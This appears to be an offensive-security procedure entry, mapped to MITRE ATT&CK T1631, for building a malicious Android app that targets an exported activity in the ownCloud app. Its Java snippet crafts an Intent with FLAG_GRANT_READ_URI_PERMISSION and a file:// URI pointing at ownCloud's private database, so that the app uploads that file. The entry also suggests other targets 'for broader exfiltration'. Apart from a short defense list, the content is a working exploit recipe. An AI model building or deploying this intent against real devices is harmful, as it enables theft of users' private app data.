---
id: proc-owncloud-craft-intent
tags:
  - android
  - intent-crafting
  - malicious-app
type: procedure
tools:
  - '[[tools/Android-Studio]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1631]]'
updated_at: '2025-12-14T17:24:41.906Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[T1631]]'
---
# Craft Malicious Intent for File Upload

## Summary

This procedure details creating a malicious Android Intent in a third-party app to target the ownCloud app's vulnerable activity, granting read permissions to protected URIs like the app's database file for unauthorized upload.

## Description

By setting the Intent's class to the vulnerable activity, action to SEND_MULTIPLE, type to */*, and adding FLAG_GRANT_READ_URI_PERMISSION, the intent tricks the ownCloud app into reading files from its private directory (/data/data/com.owncloud.android/databases/filelist) via the EXTRA_STREAM extra. This is done in Java code within a custom malicious app, exploiting the lack of URI validation in the exported component. Prerequisites include an Android development setup; outcomes enable seamless data exfiltration upon intent dispatch.

## Requirements

1. Android Studio or equivalent IDE for app development
2. Knowledge of Android Intent API (Java/Kotlin)
3. Target device with ownCloud app installed

## Defense

Defensive measures and detection strategies:

- Implement URI permission checks in activity onReceive() to restrict to external storage only
- Use PendingIntent or signature permissions to limit inter-app communication
- Scan for FLAG_GRANT_READ_URI_PERMISSION abuse in app logs or via mobile security tools like MobSF

## Objectives

1. Construct an intent that bypasses protections to access internal app files
2. Target sensitive data like databases for upload
3. Prepare for non-interactive execution from a malicious app

## Instructions

### Step 1: Set Up Malicious App Project

**Context**: Create a basic Android app project to host the intent code.

**Instructions**: In Android Studio, create a new project with a MainActivity. Add necessary permissions in AndroidManifest.xml if needed (none required for this exploit).

### Step 2: Build the Intent Object

**Context**: Assemble the intent with components to invoke the vulnerable activity and specify the protected URI.

**Command** (Java Code Snippet):
```java
import android.content.Intent;
import android.net.Uri;
import java.util.ArrayList;

ArrayList<Uri> uriList = new ArrayList<>();
uriList.add(Uri.parse("file:///data/data/com.owncloud.android/databases/filelist")); // Target database

Intent maliciousIntent = new Intent(Intent.ACTION_SEND_MULTIPLE);
maliciousIntent.setClassName("com.owncloud.android", "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
maliciousIntent.setType("*/*");
maliciousIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
maliciousIntent.putParcelableArrayListExtra(Intent.EXTRA_STREAM, uriList);
```

> This code creates the intent; replace the URI with other targets like cache files for broader exfiltration.

### Step 3: Verify Intent Structure

**Context**: Log or debug the intent to ensure correct flags and extras before dispatch.

**Instructions**: Add Log.d("MaliciousApp", maliciousIntent.toString()); to output details, confirming class, action, and URI inclusion.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[T1631]] Access Permission to Specific Component

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Android-Studio]]

## Tags

- [[android]]
- [[intent-crafting]]
- [[malicious-app]]
